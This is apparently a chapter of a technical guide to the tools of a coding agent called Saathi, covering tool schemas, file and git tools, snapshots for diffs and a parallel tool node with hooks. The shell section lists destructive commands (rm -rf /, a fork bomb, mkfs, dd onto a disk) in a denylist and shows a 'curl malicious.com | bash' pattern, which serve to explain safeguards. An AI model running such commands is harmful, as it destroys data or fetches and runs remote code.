# Chapter 7 — Tools and the Tool Node: Parallel Execution with Hooks

> "Give an LLM a function and it will call that function forever."
> — Every production agent team, eventually

---

## Table of Contents

1. [What is a Tool?](#1-what-is-a-tool)
2. [Tool Schema Generation](#2-tool-schema-generation)
3. [All 15 Saathi Tools](#3-all-15-saathi-tools)
4. [`run_bash` and the Denylist](#4-run_bash-and-the-denylist)
5. [File Snapshots for `/diff`](#5-file-snapshots-for-diff)
6. [The LangGraph `ToolNode`](#6-the-langgraph-toolnode)
7. [Saathi's Custom Tool Node](#7-saathis-custom-tool-node)
8. [`_result_to_text`](#8-_result_to_text)
9. [Every Tool Call is Answered](#9-every-tool-call-is-answered)
10. [Parallel Execution Timing](#10-parallel-execution-timing)
11. [The Semaphore Cap](#11-the-semaphore-cap)
12. [Hook Integration](#12-hook-integration)
13. [Tool Results in the Agent Loop](#13-tool-results-in-the-agent-loop)
14. [Async Tools](#14-async-tools)
15. [Adding a New Tool to Saathi](#15-adding-a-new-tool-to-saathi)

---

## 1. What is a Tool?

### The Fundamental Concept

An LLM, by itself, is a closed system. It has knowledge from training, the ability to reason, and the ability to produce text. But it cannot:

- Read files from your disk
- Run shell commands
- Search the internet
- Write code changes and save them
- Query a database
- Call an API

**Tools** are the bridge between the LLM's reasoning capability and the outside world. A tool is a function the LLM can choose to call during its reasoning process. When it calls the tool, the result comes back as a `ToolMessage` and the LLM can use that information in its next step.

From the LLM's perspective, tools are described in the system prompt (or via the API's `tools` parameter). The LLM sees a name, a description, and a JSON Schema for the parameters. It decides whether to call a tool, and if so, what arguments to pass.

From the developer's perspective, a tool is just a Python function annotated with `@tool`.

### The `@tool` Decorator

LangChain provides the `@tool` decorator for converting Python functions into tools:

```python
from langchain_core.tools import tool

@tool
def read_file(path: str) -> str:
    """Read the contents of a file. Use this before editing any file."""
    try:
        p = Path(path)
        if not p.exists():
            return f"Error: file not found: {path}"
        ...
        return p.read_text(encoding="utf-8", errors="replace")
    except OSError as e:
        return f"Error reading {path}: {e}"
```

The decorator reads:

1. **The function name** → becomes the tool name the LLM calls
2. **The docstring** → becomes the tool description sent to the LLM
3. **The type annotations** → becomes the JSON Schema for parameters
4. **The return type** → informs the LLM what to expect back

After decoration, `read_file` is a `StructuredTool` object with:

- `read_file.name = "read_file"`
- `read_file.description = "Read the contents of a file. Use this before editing any file."`
- `read_file.args_schema` = a Pydantic model with `path: str` field
- `read_file.invoke({"path": "..."})` = calls the underlying function

### The Model Decides to Call Tools

Here is what happens from the model's viewpoint during a saathi turn:

1. The model receives: system prompt + conversation history
2. The system prompt includes tool schemas (injected by LangChain via `llm.bind_tools(tools)`)
3. The model decides: "I need to read this file before I can answer"
4. Instead of producing a text response, the model produces an `AIMessage` with `tool_calls` populated
5. The tool node sees those `tool_calls`, executes them, and returns `ToolMessage` results
6. The model receives the results and can now produce a final text answer

The model never actually "runs" the tools. It just says "call this function with these arguments." The tool node is the executor.

### Tools Are the Bottleneck

In a coding agent, the quality of the tools determines the quality of the agent. A model with mediocre reasoning but excellent tools will outperform a brilliant model with poor tools. Why?

- **Tools ground the model in reality.** Without `read_file`, the model hallucinates file contents. With it, the model sees the actual source.
- **Tools make the model's actions reversible.** `write_file` changes files, but you can see what changed via `/diff`. The model's text responses cannot be audited this way.
- **Tools encode your policies.** The `run_bash` denylist, the `block_paths` pattern, the `git_commit` safeguard — all of these are tool-level enforcements that the model cannot override.

---

## 2. Tool Schema Generation

### From Python Function to JSON Schema

The `@tool` decorator uses Pydantic under the hood to generate a JSON Schema from the function's type annotations. This schema is what gets sent to the LLM.

Here is the full `write_file` tool:

```python
@tool
def write_file(path: str, content: str) -> str:
    """Create or overwrite a file; parent directories are created automatically."""
    try:
        p = Path(path)
        original = p.read_text(encoding="utf-8", errors="replace") if p.exists() else ""
        _turn_snapshots.setdefault(str(p.resolve()), original)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
        return f"Written {len(content)} chars to {path}"
    except OSError as e:
        return f"Error writing {path}: {e}"
```

The JSON Schema LangChain generates and sends to the LLM:

```json
{
  "name": "write_file",
  "description": "Create or overwrite a file; parent directories are created automatically.",
  "parameters": {
    "type": "object",
    "properties": {
      "path": {
        "type": "string",
        "description": "path"
      },
      "content": {
        "type": "string",
        "description": "content"
      }
    },
    "required": ["path", "content"]
  }
}
```

The LLM uses this schema to:

- Know the tool exists and what it does (from `description`)
- Know what parameters to provide (from `properties`)
- Know which parameters are mandatory (from `required`)
- Validate its own output before emitting the tool call

### The Docstring Is the Most Important Thing

The description field — drawn directly from the Python docstring — is the single most important factor in whether the LLM uses a tool correctly.

Consider the difference between these two docstrings for `read_file`:

**Bad docstring:**

```python
@tool
def read_file(path: str) -> str:
    """Read a file."""
    ...
```

The LLM doesn't know:

- Should it call this before editing?
- What format does the path take?
- What happens if the file doesn't exist?
- Are there size limits?

**Good docstring (saathi's actual docstring):**

```python
@tool
def read_file(path: str) -> str:
    """Read the contents of a file. Use this before editing any file."""
    ...
```

The instruction "Use this before editing any file" is not for humans — it's for the model. It creates a behavioral contract: the model will read files before writing them, because it was explicitly told to.

**Extended docstring for complex tools:**

```python
@tool
def run_bash(command: str) -> str:
    """
    Run a shell command and return its output (stdout + stderr).
    Timeout: 60 seconds. Avoid destructive one-liners.
    """
    ...
```

The "Timeout: 60 seconds" clause tells the model not to run commands that take longer. "Avoid destructive one-liners" is a behavioral instruction.

The golden rule: **write the docstring as if explaining the tool to a new developer who will use it in every situation.** Because that's exactly what you're doing — the model is that developer.

### Parameter Names Matter Too

Parameter names become the JSON Schema property names, which the LLM sees. Choose names that are self-documenting:

```python
# Bad: ambiguous parameter name
@tool
def search_in_file(f: str, p: str) -> str:
    """Search for a pattern in a file."""
    ...

# Good: clear parameter names
@tool
def search_in_file(path: str, pattern: str) -> str:
    """Search for a regex pattern inside a single file. Returns matching lines with line numbers."""
    ...
```

The LLM reads `path` and `pattern` and immediately understands what to pass. It reads `f` and `p` and has to guess.

### Complex Parameter Types

For tools with more complex parameters, you can use Pydantic models or more descriptive type hints:

```python
from typing import Literal
from langchain_core.tools import tool

@tool
def save_memory(scope: Literal["global", "project"], key: str, value: str) -> str:
    """
    Persist a fact for future sessions.
    scope: 'global' (user-level, ~/.saathi/) or 'project' (.saathi/ in cwd).
    Example: save_memory('project', 'entry_point', 'src/main.py')
    """
    ...
```

The `Literal["global", "project"]` type annotation generates a JSON Schema `enum` constraint. The LLM sees that `scope` must be one of exactly two values, which prevents it from passing invalid values.

The docstring example `save_memory('project', 'entry_point', 'src/main.py')` is a few-shot example for the model. Concrete examples in docstrings dramatically improve model accuracy for tools with non-obvious parameter semantics.

---

## 3. All 15 Saathi Tools

Saathi ships with 15 tools organized into five categories. The full list is in `src/saathi/tools/__init__.py`:

```python
ALL_TOOLS = [
    read_file,
    write_file,
    patch_file,
    list_directory,
    run_bash,
    search_in_file,
    search_across_files,
    search_web,
    save_memory,
    recall_memory,
    git_status,
    git_diff,
    git_diff_staged,
    git_log,
    git_commit,
]
```

### Category 1: Filesystem Tools

#### `read_file(path: str) -> str`

**Source:** `src/saathi/tools/filesystem.py`

Reads a file and returns its contents as a string. Enforces a 200,000 byte size limit to prevent the model from reading huge files that would overflow the context window.

```python
@tool
def read_file(path: str) -> str:
    """Read the contents of a file. Use this before editing any file."""
    try:
        p = Path(path)
        if not p.exists():
            return f"Error: file not found: {path}"
        size = p.stat().st_size
        if size > _MAX_READ_BYTES:
            return f"Error: file too large ({size} bytes). Read specific sections instead."
        return p.read_text(encoding="utf-8", errors="replace")
    except OSError as e:
        return f"Error reading {path}: {e}"
```

Key design decisions:

- Returns an error string (not raises) — the model can handle errors gracefully
- The `errors="replace"` flag prevents crashes on binary files
- The size limit is a constant (`_MAX_READ_BYTES = 200_000`) for easy tuning

**When the model uses it:** Before any edit operation. The system prompt says "Always read a file before modifying it."

#### `write_file(path: str, content: str) -> str`

Creates or overwrites a file. Automatically creates parent directories. Captures the original content as a snapshot (see Section 5).

```python
@tool
def write_file(path: str, content: str) -> str:
    """Create or overwrite a file; parent directories are created automatically."""
    try:
        p = Path(path)
        original = p.read_text(encoding="utf-8", errors="replace") if p.exists() else ""
        _turn_snapshots.setdefault(str(p.resolve()), original)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
        return f"Written {len(content)} chars to {path}"
    except OSError as e:
        return f"Error writing {path}: {e}"
```

Key design decisions:

- Confirmation message includes character count — the model knows the write succeeded
- `p.parent.mkdir(parents=True, exist_ok=True)` — creates full directory tree silently
- Snapshot captured with `setdefault` — explained in Section 5

**When the model uses it:** For creating new files or when a complete rewrite is needed. The system prompt says "Prefer patch_file over write_file for targeted edits."

#### `patch_file(path: str, diff: str) -> str`

Applies a unified diff to an existing file using the system `patch` command. Preferred over `write_file` for targeted edits because it's explicit about what changed.

```python
@tool
def patch_file(path: str, diff: str) -> str:
    """Apply a unified diff patch to an existing file (prefer over write_file for edits)."""
    import tempfile

    p = Path(path)
    if not p.exists():
        return f"Error: file not found: {path}"

    original = p.read_text(encoding="utf-8", errors="replace")
    _turn_snapshots.setdefault(str(p.resolve()), original)

    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".patch", delete=False, encoding="utf-8"
    ) as tf:
        tf.write(diff)
        patch_path = tf.name

    try:
        result = subprocess.run(
            ["patch", str(p), patch_path],
            capture_output=True,
            text=True,
            timeout=15,
        )
        if result.returncode != 0:
            return f"Patch failed:\n{result.stderr}"
        return f"Patched {path} successfully"
    except FileNotFoundError:
        return "Error: 'patch' command not found. Install it or use write_file instead."
    finally:
        Path(patch_path).unlink(missing_ok=True)
```

Key design decisions:

- Uses a temp file for the patch (subprocess `patch` needs a file, not stdin)
- Temp file cleaned up in `finally` — no leaks even on error
- Falls back gracefully if `patch` command isn't installed
- Also captures snapshots for `/diff` tracking

**When the model uses it:** For targeted line-level changes. `diff` must be a valid unified diff format:

```diff
--- a/src/auth.py
+++ b/src/auth.py
@@ -15,6 +15,7 @@
 def login(user, password):
+    _check_rate_limit(user)
     hashed = hash_password(password)
     return User.query.filter_by(username=user, password=hashed).first()
```

#### `list_directory(path: str = ".") -> str`

Lists files and directories, showing sizes. Skips hidden files (starting with `.`).

```python
@tool
def list_directory(path: str = ".") -> str:
    """List the contents of a directory, showing file sizes."""
    try:
        p = Path(path)
        if not p.exists():
            return f"Error: path not found: {path}"
        if not p.is_dir():
            return f"Error: {path} is not a directory"

        entries = sorted(p.iterdir(), key=lambda e: (e.is_file(), e.name))
        lines: list[str] = []
        for entry in entries:
            if entry.name.startswith("."):
                continue
            if entry.is_dir():
                lines.append(f"[dir]  {entry.name}/")
            else:
                size = entry.stat().st_size
                lines.append(f"[file] {entry.name}  ({size:,} bytes)")
        return "\n".join(lines) if lines else "(empty directory)"
    except OSError as e:
        return f"Error listing {path}: {e}"
```

Key design decisions:

- Sorted with directories first (sorted key `(e.is_file(), e.name)`)
- File sizes help the model decide whether to read a file (a 2MB file has different implications than a 2KB file)
- Skips hidden files — the model rarely needs to read `.git/objects/` or `__pycache__/`

**When the model uses it:** At the start of a new task to understand the project structure. Part of the `/init` workflow.

### Category 2: Shell Tool

#### `run_bash(command: str) -> str`

Executes a shell command. The most powerful and dangerous tool. Returns combined stdout + stderr with a 60-second timeout.

Full source and denylist discussion in Section 4.

**When the model uses it:** For running tests, build commands, formatting tools, or any operation that doesn't have a dedicated tool. Examples:

```text
pytest -xvs tests/
ruff check src/
python -m build
cat /proc/meminfo
```

### Category 3: Search Tools

#### `search_in_file(path: str, pattern: str) -> str`

Searches a single file for a regex pattern. Returns matching lines with line numbers.

```python
@tool
def search_in_file(path: str, pattern: str) -> str:
    """Search for a regex pattern inside a single file. Returns matching lines with line numbers."""
    try:
        p = Path(path)
        if not p.exists():
            return f"Error: file not found: {path}"
        lines = p.read_text(encoding="utf-8", errors="replace").splitlines()
        matches: list[str] = []
        for i, line in enumerate(lines, 1):
            if re.search(pattern, line):
                matches.append(f"{i}: {line}")
        if not matches:
            return f"No matches for '{pattern}' in {path}"
        return "\n".join(matches[:_MAX_FILE_MATCHES])
    except re.error as e:
        return f"Invalid pattern: {e}"
    except OSError as e:
        return f"Error reading {path}: {e}"
```

Key design decisions:

- Line numbers in output (`{i}: {line}`) — the model can cite exact lines
- Cap at 200 matches — prevents context overflow from wildcard patterns
- Handles invalid regex gracefully with descriptive error

**When the model uses it:** "Find where `login` is defined in `auth.py`."

#### `search_across_files(directory: str, pattern: str, file_glob: str = "**/*") -> str`

Recursive grep across all files in a directory.

```python
@tool
def search_across_files(
    directory: str,
    pattern: str,
    file_glob: str = "**/*",
) -> str:
    """Recursively search for a regex pattern across all files in a directory."""
    try:
        base = Path(directory)
        ...
        regex = re.compile(pattern)
        results: list[str] = []

        for filepath in sorted(base.glob(file_glob)):
            if not filepath.is_file():
                continue
            if filepath.stat().st_size > 500_000:
                continue  # skip large files
            try:
                for i, line in enumerate(
                    filepath.read_text(encoding="utf-8", errors="replace").splitlines(), 1
                ):
                    if regex.search(line):
                        rel = filepath.relative_to(base)
                        results.append(f"{rel}:{i}: {line.strip()}")
                        if len(results) >= _MAX_FILE_MATCHES:
                            results.append(f"... (capped at {_MAX_FILE_MATCHES} matches)")
                            return "\n".join(results)
            except OSError:
                continue
        ...
```

Key design decisions:

- Output format `{relative_path}:{line_num}: {content}` — mirrors grep output, which models understand
- Skips files larger than 500KB — prevents hanging on binary/generated files
- `file_glob` parameter allows scoping to specific file types: `"**/*.py"`, `"**/*.json"`
- Per-file error handling with `continue` — one unreadable file doesn't abort the whole search

**When the model uses it:** "Find all places where `rate_limit` is called across the project."

#### `search_web(query: str) -> str`

Searches the internet. Uses DuckDuckGo by default, Brave Search if an API key is configured.

```python
@tool
def search_web(query: str) -> str:
    """Search the web for current information using DuckDuckGo (or Brave if configured)."""
    if settings.brave_api_key:
        return _brave_search(query, settings.brave_api_key)
    return _ddg_search(query)
```

Key design decisions:

- Zero-config: works out of the box with DuckDuckGo
- Upgrade path: set `SAATHI_BRAVE_API_KEY` in env for better results
- Returns structured results: title, URL, snippet for each hit

**When the model uses it:** For documentation lookup, error message searches, or anything where training data might be stale. "What's the correct syntax for `asyncio.gather` with error handling?"

### Category 4: Memory Tools

#### `save_memory(scope: str, key: str, value: str) -> str`

Persists a fact for future sessions.

```python
@tool
def save_memory(scope: str, key: str, value: str) -> str:
    """
    Persist a fact for future sessions.
    scope: 'global' (user-level, ~/.saathi/) or 'project' (.saathi/ in cwd).
    Example: save_memory('project', 'entry_point', 'src/main.py')
    """
    if scope not in ("global", "project"):
        return "Error: scope must be 'global' or 'project'"
    _store.save(scope, key, value)
    return f"Saved [{scope}] {key} = {value}"
```

Two scopes:

- `global`: stored in `~/.saathi/memory.json` — survives across projects
- `project`: stored in `.saathi/memory.json` — scoped to the current directory

**When the model uses it:** When it discovers a useful fact that should persist: "The entry point is `src/main.py`", "Tests are run with `pytest -xvs`", "The database is PostgreSQL on port 5433".

#### `recall_memory(scope: str = "all") -> str`

Retrieves saved facts.

```python
@tool
def recall_memory(scope: str = "all") -> str:
    """
    Retrieve saved facts.
    scope: 'global', 'project', or 'all' (default).
    """
    data = _store.all()
    if scope == "global":
        facts = data["global"]
    elif scope == "project":
        facts = data["project"]
    else:
        facts = {**data["global"], **data["project"]}

    if not facts:
        return "No facts saved yet."
    lines = [f"  {k}: {v}" for k, v in facts.items()]
    return "\n".join(lines)
```

**When the model uses it:** At the start of a new task to recall project-specific facts it learned in previous sessions.

Note: Memory facts are also injected into the system prompt automatically via `MemoryStore.format_for_prompt()`, so the model doesn't need to explicitly call `recall_memory` in most cases. The tool is useful when the model needs to check if a specific fact is saved, or to display memory to the user.

### Category 5: Git Tools

All git tools delegate to a shared `_git(*args)` helper that runs `git` subprocess and returns the output. The helper handles the common failure modes:

```python
def _git(*args: str) -> str:
    try:
        proc = subprocess.run(
            ["git", *args],
            capture_output=True,
            text=True,
            timeout=_TIMEOUT,
            encoding="utf-8",
            errors="replace",
        )
    except FileNotFoundError:
        return "Error: git is not installed or not on PATH."
    except subprocess.TimeoutExpired:
        return f"Error: git {args[0]} timed out after {_TIMEOUT}s."

    if proc.returncode != 0:
        err = proc.stderr.strip() or proc.stdout.strip()
        if "not a git repository" in err.lower():
            return "Error: not a git repository."
        return f"git {args[0]} failed:\n{err}"
    return proc.stdout.strip() or "(no output)"
```

#### `git_status() -> str`

Shows working tree status (`git status --short --branch`). The `--short` flag produces compact output that's easier for the model to parse than the full verbose status.

#### `git_diff(path: str = "") -> str`

Shows unstaged changes. Truncates at 20,000 characters to prevent context overflow on large diffs.

```python
@tool
def git_diff(path: str = "") -> str:
    """Show unstaged changes. Optionally limit to a single file or directory path."""
    args = ["diff"]
    if path:
        args.append(path)
    out = _git(*args)
    if len(out) > 20_000:
        return out[:20_000] + "\n… (diff truncated at 20k chars)"
    return out
```

#### `git_diff_staged() -> str`

Shows staged changes (`git diff --cached`). Also truncated at 20,000 characters.

**When the model uses it:** Before writing a commit message — "let me see what's actually staged."

#### `git_log(n: int = 10) -> str`

Shows the last N commits in one-line format. Capped at 50 to prevent enormous outputs.

```python
@tool
def git_log(n: int = 10) -> str:
    """Show the most recent commits (default 10) in a compact one-line format."""
    return _git("log", f"-{max(1, min(n, 50))}", "--oneline", "--decorate")
```

#### `git_commit(message: str, add_all: bool = False) -> str`

Creates a commit. The most "dangerous" git tool — it actually modifies history.

```python
@tool
def git_commit(message: str, add_all: bool = False) -> str:
    """
    Create a git commit with the given message.
    Set add_all=True to stage all tracked changes first (git add -A).
    Only commit when the user has asked for it.
    """
    if add_all:
        staged = _git("add", "-A")
        if staged.startswith("Error") or "failed" in staged:
            return staged
    return _git("commit", "-m", message)
```

The docstring instruction "Only commit when the user has asked for it" is a behavioral guardrail. The model is told explicitly: do not call `git_commit` speculatively. Saathi's MEMORY.md records "user keeps git manual to avoid accidental repo corruption" — this aligns with that preference.

---

## 4. `run_bash` and the Denylist

### Why Shell Access is Both Essential and Dangerous

`run_bash` is the escape valve. When no specific tool covers the need, the shell covers it. Running tests, linting, building, querying processes, checking memory — all of these need a shell.

But shell access is also the most dangerous thing you can give an LLM. A confused or adversarially prompted model could run:

- `rm -rf /` — delete the entire filesystem
- `:(){ :|:& };:` — the fork bomb, crashing the system
- `mkfs.ext4 /dev/sda` — format the disk
- `dd if=/dev/zero of=/dev/sda` — overwrite the disk with zeros
- `chmod -R 777 /` — remove all security from every file

### The Denylist Implementation

```python
# From src/saathi/tools/shell.py
_BLOCKED = frozenset(
    [
        "rm -rf /",
        ":(){ :|:& };:",
        "mkfs",
        "dd if=/dev/zero",
        "chmod -R 777 /",
        "> /dev/sda",
    ]
)


@tool
def run_bash(command: str) -> str:
    """
    Run a shell command and return its output (stdout + stderr).
    Timeout: 60 seconds. Avoid destructive one-liners.
    """
    for blocked in _BLOCKED:
        if blocked in command:
            return f"Blocked: command matches safety denylist: '{blocked}'"
    ...
```

The check is a simple substring match: `if blocked in command`. This is intentionally conservative — it blocks commands even if the dangerous substring is part of a longer command.

The check happens BEFORE any subprocess is spawned. This means blocked commands return immediately without touching the system. The model receives the blocked reason and can choose a safer alternative.

### What the Denylist Does and Does Not Cover

The denylist covers the most catastrophic known patterns. It does NOT cover:

- `rm -rf ./node_modules` — legitimate cleanup
- `rm -rf ./build` — legitimate cleanup
- `sudo ...` — the model might try to elevate, but will just get a permission error
- `curl http://malicious.com | bash` — supply-chain attack pattern
- Python/Node scripts that do destructive things

This is intentional. A complete denylist is impossible — there are infinitely many ways to cause damage. The denylist covers the obvious cases. For a production deployment, you would want additional sandboxing (containers, restricted filesystem mounts, no sudo).

Saathi is designed for **local development** where the user trusts themselves and the model they're running (a local Ollama instance). The denylist is a safety net, not a security perimeter.

### Platform-Specific Execution

```python
if sys.platform == "win32":
    proc = subprocess.run(
        command,
        shell=True,         # use cmd.exe on Windows
        capture_output=True,
        text=True,
        timeout=60,
        encoding="utf-8",
        errors="replace",
    )
else:
    proc = subprocess.run(
        shlex.split(command),   # parse shell syntax on Unix
        capture_output=True,
        text=True,
        timeout=60,
        encoding="utf-8",
        errors="replace",
    )
```

On Windows, `shell=True` delegates to `cmd.exe`. On Unix, `shlex.split` parses the command into a list (handling quoted arguments correctly) and passes it directly to `execve`. The `shlex.split` approach is safer than `shell=True` on Unix because it avoids shell injection.

### Output Formatting

```python
out = proc.stdout.strip()
err = proc.stderr.strip()
parts: list[str] = []
if out:
    parts.append(out)
if err:
    parts.append(f"[stderr]\n{err}")
if proc.returncode != 0:
    parts.append(f"[exit code: {proc.returncode}]")
return "\n".join(parts) if parts else "(no output)"
```

The output structure:

- `stdout` first (the normal output)
- `[stderr]` section if there was stderr (labeled so the model knows it's error output)
- `[exit code: N]` if non-zero (tells the model the command failed)

The model can parse this output and decide what to do:

- Exit code 0, empty stderr → success, proceed
- Exit code non-zero → command failed, diagnose from output
- Large stderr → possible compilation/test errors to analyze

---

## 5. File Snapshots for `/diff`

### The Problem: Showing What Changed This Session

The `/diff` command in saathi shows which files were changed during the current session, with a unified diff showing the before and after. This is invaluable for reviewing the model's work before committing.

The mechanism: capture the original content of every file the model touches, keep it in memory, and compare to the current content when `/diff` is called.

This sounds simple. The implementation has a subtle bug that was fixed.

### The Bug: Snapshots Captured Before Turn Ran

The naive implementation would capture snapshots at the start of each turn:

```python
# BUGGY APPROACH — don't do this
async def execute_task(task: str) -> None:
    # Capture snapshots of all context files before the turn runs
    for path in state.context_paths:
        content = Path(path).read_text() if Path(path).exists() else ""
        session_start_snapshots.setdefault(path, content)
    
    # Run the turn
    await _run_turn(graph, config, task, state, messages)
```

This has two problems:

1. **You don't know which files the model will touch.** The model might edit 20 files, only one of which is in `context_paths`.

2. **If you pre-capture all files, you'd need to read the entire project.** That's both slow and wasteful.

### The Real Bug: Snapshots Captured After First Write

The actual bug that was fixed in saathi is more subtle. Here was the original approach:

```python
# ALSO BUGGY — pre-turn snapshot capture
# Captured at the START of the turn, before write_file runs
for path in state.context_paths:
    snap = read_content(path)
    snapshots[path] = snap   # captured before the turn!

# Then the model runs and writes files...
```

The bug: if you capture snapshots at the START of a turn, and the model then writes a file, the snapshot correctly contains the pre-edit content. BUT if you capture snapshots BEFORE the graph runs (before any tool has been called), you're reading the same content that the model is about to read — which might already be the modified content from a PREVIOUS turn.

Concretely:

- Turn 1: Model writes "version 1" to `auth.py`
- Turn 2: Snapshots captured at turn start → `auth.py` contains "version 1" (the result of turn 1)
- Turn 2: Model overwrites with "version 2"
- `/diff` → shows the diff between "version 1" (captured at turn 2 start) and "version 2"

The diff shows changes within turn 2, not changes since the session started. If you wanted to see all changes since the session began, you'd need the original content from BEFORE turn 1.

### The Fix: `setdefault` in `write_file`

The correct approach is to capture the snapshot INSIDE the tool, using `setdefault` to ensure only the FIRST version is kept:

```python
# From src/saathi/tools/filesystem.py
_turn_snapshots: dict[str, str] = {}

@tool
def write_file(path: str, content: str) -> str:
    """Create or overwrite a file; parent directories are created automatically."""
    p = Path(path)
    original = p.read_text(encoding="utf-8", errors="replace") if p.exists() else ""
    # setdefault: keep the pre-edit content from the FIRST touch this turn,
    # so repeated edits to one file don't clobber its true original for /diff.
    _turn_snapshots.setdefault(str(p.resolve()), original)
    ...
```

`setdefault` is the key: it only sets the value if the key doesn't exist yet. So:

- First `write_file("auth.py", ...)` call: `_turn_snapshots["auth.py"] = "original content"`
- Second `write_file("auth.py", ...)` call: `_turn_snapshots["auth.py"]` already exists, `setdefault` does nothing

The CLI then accumulates these per-turn snapshots into a session-level dict with the same `setdefault` logic:

```python
# From cli.py execute_task
for path, original in get_turn_snapshots().items():
    session_start_snapshots.setdefault(path, original)
```

Turn 1 writes `auth.py` with original "v0" → `session_start_snapshots["auth.py"] = "v0"`
Turn 2 writes `auth.py` again → `setdefault` preserves "v0" (the true original)
`/diff` compares "v0" to current content → shows all changes since session started

### The Test Suite That Documents the Fix

The test file `tests/test_snapshots.py` documents exactly these semantics:

```python
def test_existing_file_snapshot_is_original(tmp_path: Path) -> None:
    clear_turn_snapshots()
    f = tmp_path / "e.txt"
    f.write_text("ORIGINAL", encoding="utf-8")
    write_file.invoke({"path": str(f), "content": "CHANGED"})
    assert get_turn_snapshots()[str(f.resolve())] == "ORIGINAL"


def test_repeated_writes_keep_first_original(tmp_path: Path) -> None:
    clear_turn_snapshots()
    f = tmp_path / "r.txt"
    f.write_text("ORIGINAL", encoding="utf-8")
    write_file.invoke({"path": str(f), "content": "v1"})
    write_file.invoke({"path": str(f), "content": "v2"})
    # Must still be the true original — not the intermediate "v1".
    assert get_turn_snapshots()[str(f.resolve())] == "ORIGINAL"


def test_new_file_snapshot_is_empty(tmp_path: Path) -> None:
    clear_turn_snapshots()
    f = tmp_path / "new.txt"
    write_file.invoke({"path": str(f), "content": "hello"})
    assert get_turn_snapshots()[str(f.resolve())] == ""
```

The third test verifies the new-file case: when the model creates a file that didn't previously exist, the snapshot is `""` (empty string). The diff will show the entire file as added.

### The Full `/diff` Flow

```python
# From src/saathi/ui/commands.py
def handle_diff(session_start_snapshots: dict[str, str]) -> None:
    changed = False
    for path_str, original in session_start_snapshots.items():
        current_path = Path(path_str)
        if not current_path.exists():
            console.print(f"[red]Deleted:[/red] {path_str}")
            changed = True
            continue
        current = current_path.read_text(encoding="utf-8", errors="replace")
        if current != original:
            diff = difflib.unified_diff(
                original.splitlines(keepends=True),
                current.splitlines(keepends=True),
                fromfile=f"a/{path_str}",
                tofile=f"b/{path_str}",
            )
            diff_text = "".join(diff)
            if diff_text:
                console.print(f"\n[bold]{path_str}[/bold]")
                console.print(diff_text)
                changed = True
    if not changed:
        console.print("[dim]No file changes this session.[/dim]")
```

Three cases:

1. File was deleted → shows "Deleted: path"
2. File content changed → shows unified diff
3. Content identical → skipped (no output)

---

## 6. The LangGraph `ToolNode`

### What the Prebuilt ToolNode Does

LangGraph ships a prebuilt `ToolNode` in `langgraph.prebuilt`:

```python
from langgraph.prebuilt import ToolNode

tool_node = ToolNode(tools)
```

It's designed to be dropped into a graph with one line:

```python
builder.add_node("tools", ToolNode(tools))
```

What it does internally:

1. Reads `state["messages"][-1]` — the last message
2. Extracts `tool_calls` from that message
3. For each tool call: finds the tool by name, invokes it
4. Wraps results in `ToolMessage` objects
5. Returns `{"messages": [ToolMessage, ToolMessage, ...]}`

The prebuilt ToolNode handles errors by default — if a tool raises an exception, it returns a `ToolMessage` with the error as content.

### Why Saathi Doesn't Use It

Saathi replaces `ToolNode` with its own `make_hooked_tool_node`. There are three reasons:

**Reason 1: No Hooks.** The prebuilt ToolNode has no concept of pre-tool hooks, post-tool hooks, or path blocking. It just calls tools. Saathi needs the pipeline:

```text
block_paths check → pre_tool hook → execute → post_tool hook
```

**Reason 2: No Parallelism Control.** The prebuilt ToolNode runs tools sequentially (or has limited parallel support that's difficult to configure). Saathi uses `asyncio.gather` with a semaphore for bounded parallel execution.

**Reason 3: No MCP Content Block Normalization.** The prebuilt ToolNode doesn't know about MCP's `[{"type": "text", "text": "..."}]` content format. Saathi's `_result_to_text` normalizer handles this.

The prebuilt ToolNode is excellent for simple use cases. Saathi's custom tool node is the right choice when you need hooks, parallelism, and MCP compatibility.

---

## 7. Saathi's Custom Tool Node

### Overview

The custom tool node is in `src/saathi/agent/tool_node.py`. The full implementation:

```python
def make_hooked_tool_node(tools: list[BaseTool], hook_runner: HookRunner):
    tools_by_name = {t.name: t for t in tools}
    semaphore = asyncio.Semaphore(max(1, settings.max_parallel_tools))

    async def _run_one(call: dict) -> ToolMessage:
        name = call["name"]
        args = call.get("args", {})
        call_id = call["id"]

        # 1. sensitive-path guard, then pre_tool hook (either may block)
        reason = hook_runner.check_block(name, args)
        if reason is None:
            reason = await hook_runner.run_pre_tool(name, args)
        if reason is not None:
            log.warning("tool_blocked", tool=name, reason=reason)
            return ToolMessage(
                content=f"BLOCKED: {reason}. The tool was not executed.",
                tool_call_id=call_id,
                name=name,
            )

        # 2. execute the tool
        tool = tools_by_name.get(name)
        if tool is None:
            log.warning("tool_unknown", tool=name)
            return ToolMessage(
                content=f"Error: unknown tool '{name}'.",
                tool_call_id=call_id,
                name=name,
            )
        log.debug("tool_start", tool=name, args=args)
        try:
            result = await tool.ainvoke(args)
        except Exception as exc:
            log.error("tool_error", tool=name, error=str(exc))
            result = f"Error executing {name}: {exc}"
        else:
            log.debug("tool_ok", tool=name)

        # 3. post_tool hook (best-effort side effects)
        await hook_runner.run("post_tool", name, args)

        return ToolMessage(content=_result_to_text(result), tool_call_id=call_id, name=name)

    async def _guarded(call: dict) -> ToolMessage:
        async with semaphore:
            return await _run_one(call)

    async def hooked_tool_node(state: AgentState) -> dict:
        last = state["messages"][-1]
        tool_calls = list(getattr(last, "tool_calls", []) or [])
        if not tool_calls:
            return {"messages": []}

        messages = await asyncio.gather(*(_guarded(call) for call in tool_calls))
        return {"messages": list(messages)}

    return hooked_tool_node
```

Let's walk through each component.

### `tools_by_name` — O(1) Tool Lookup

```python
tools_by_name = {t.name: t for t in tools}
```

A dict from tool name string to tool object. Built once when the node is created. When the model calls `read_file`, the node does `tools_by_name["read_file"]` in O(1) time, not O(n) linear scan.

With 15 built-in tools plus potentially many MCP tools, this optimization matters.

### `asyncio.Semaphore` — Bounding Parallelism

```python
semaphore = asyncio.Semaphore(max(1, settings.max_parallel_tools))
```

An `asyncio.Semaphore` limits how many coroutines can enter a critical section simultaneously. With `max_parallel_tools=8` (default), at most 8 tool calls run at the same time.

The `max(1, ...)` ensures the semaphore is always at least 1 — a semaphore of 0 would block everything forever.

Why not unlimited parallelism? Because:

1. The local Ollama server has its own `OLLAMA_NUM_PARALLEL` setting. Sending more requests than it can handle causes queuing at the Ollama level.
